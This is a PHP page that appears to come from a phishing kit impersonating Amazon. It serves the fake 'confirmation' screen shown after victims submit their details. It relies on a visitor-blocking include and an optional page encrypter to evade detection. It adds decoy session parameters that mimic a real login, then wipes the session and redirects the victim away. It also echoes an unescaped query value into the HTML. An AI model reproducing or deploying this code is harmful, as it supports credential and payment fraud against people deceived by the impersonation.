<?php
error_reporting(0);
@ob_start();
session_start();
session_set_cookie_params(0);

if(!isset($_SESSION['SESSION_ID']))
{
	header("location: index.php");	
	exit;
}

require_once 'inc/check_blocked.php'; 
include_once 'inc/config.php';

$_GET = array();
  $params = explode('&', $_SERVER['QUERY_STRING']);
  foreach ($params as $pair) {
    list($key, $value) = explode('=', $pair);
    $_GET[urldecode($key)] = urldecode($value);
}
$fake_session_params = "success.php?loggedin=1&header=1&en=".$_GET['en'];

if(!isset($_SESSION['LANG'])) {
	if($dynamic_language) {
		$_SESSION['LANG'] = getBrowserLanguage(substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2));
	} else {
		$_SESSION['LANG'] = $default_language.'.php';
	}
}

require_once 'languages/'.$_SESSION['LANG'];
?>

<!DOCTYPE HTML>
<html>
<head>
<?php 
if($enable_encrypter) {
	require_once 'inc/encrypter.php'; 
}
?>
<title><?php echo $lang['CONFIRMATION_TITLE']; ?></title>
<meta charset="utf-8" />
<META HTTP-EQUIV="Refresh" CONTENT="6;URL=<?php echo $indexs; ?>">
<link rel="shortcut icon" href="assets/imgs/favicon.ico">
<link media="all" href="assets/css/style2.css?sessionid=<?php echo $fake_session_params;?>" type="text/css" rel="stylesheet">
<body>
  <table align="center" width="620" cellspacing="0" cellpadding="0" border="0">
    <tbody><tr>
      <td>
        <img src="assets/imgs/l.png" alt="Amazon.com"  border="0">
      </td>
    </tr>
  </tbody></table>
  <br><br>
  <table style="padding-top: 40px;" align="center" height="225" width="620" cellspacing="0" cellpadding="2" border="0">
    <tbody><tr>
      <td>
<div style="padding-bottom: 10px;">
    <!--[if IE]>
    <style>.dsv-cBox { height: 1%; }</style>
    <![endif]-->
<div class="dsv-cBox dsv-secondary">
  <span class="dsv-cBoxTL"><!-- &nbsp; --></span>
  <span class="dsv-cBoxTR"><!-- &nbsp; --></span>
  <span class="dsv-cBoxR"><!-- &nbsp; --></span>
  <span class="dsv-cBoxBL"><!-- &nbsp; --></span>
  <span class="dsv-cBoxBR"><!-- &nbsp; --></span>
  <span class="dsv-cBoxB"><!-- &nbsp; --></span>
  <div class="dsv-cBoxInner" style="padding: 7px;">
          <table style="background-color: rgb(255, 255, 255);" width="600" cellspacing="0" cellpadding="0">
            <tbody><tr>
              <td>
                <div style="padding-top: 0px; padding-bottom: 0px;" align="center">       
                      
                  <div style="padding-top: 45px;">
                    
                  
        <span class="dsv-wfw-title"><?php echo $lang['CONFIRMATION_NOTE_1']; ?></span>
        <div style="padding-top: 13px;">
            <?php echo $lang['CONFIRMATION_NOTE_2']; ?>
        </div>
                  </div>
                </div>
              </td>
            </tr>
         
                <tr>
              <td>
                <div style="padding-top: 25px;" align="center">
                  <img src="assets/imgs/confirmation.png" height="52" width="52" border="0">
                </div>
              </td>
            </tr>
  
            <tr> 
              <td><div style="height: 25px;">&nbsp;</div></td>
            </tr>
          </tbody></table>
  </div>
</div>       
</div>
      </td>
    </tr>
  </tbody></table>
</div>
</body>
</html>
<?php
if($final_redirect_url !== '') {
	session_destroy();
	header("refresh:5; url=$final_redirect_url");
}
ob_end_flush(); 
?>